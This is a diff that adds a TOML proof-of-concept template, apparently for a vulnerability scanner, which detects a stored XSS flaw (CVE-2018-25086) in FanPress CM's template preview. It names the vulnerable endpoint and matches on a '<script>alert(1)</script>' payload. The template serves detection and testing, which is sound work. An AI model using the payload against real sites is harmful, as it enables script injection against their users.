@@ -1,0 +1,45 @@
+[info]
+id = "POC-AVE-2018-0016"
+name = "FanPress CM Template Preview XSS PoC"
+author = "AVE"
+severity = "medium"
+tags = ["xss", "cve-2018-25086"]
+description = "FanPress CM 3.6.3 及之前版本模板预览功能存在存储型 XSS 漏洞。编辑器用户可创建包含 <script> 标签的文章，在访问模板预览页面时脚本被执行。"
+vuln_id = ["CVE-2018-25086", "AVE-2018-0016"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/index.php"
+headers.Cookie = "FPCM_AUTH={{session}}"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["FPCM_TEMPLATE_PREVIEW"]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/index.php"
+body.type = "form"
+body.module = "system/templatepreview"
+body.tid = "1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["<script>alert(1)</script>"]
+expect = true
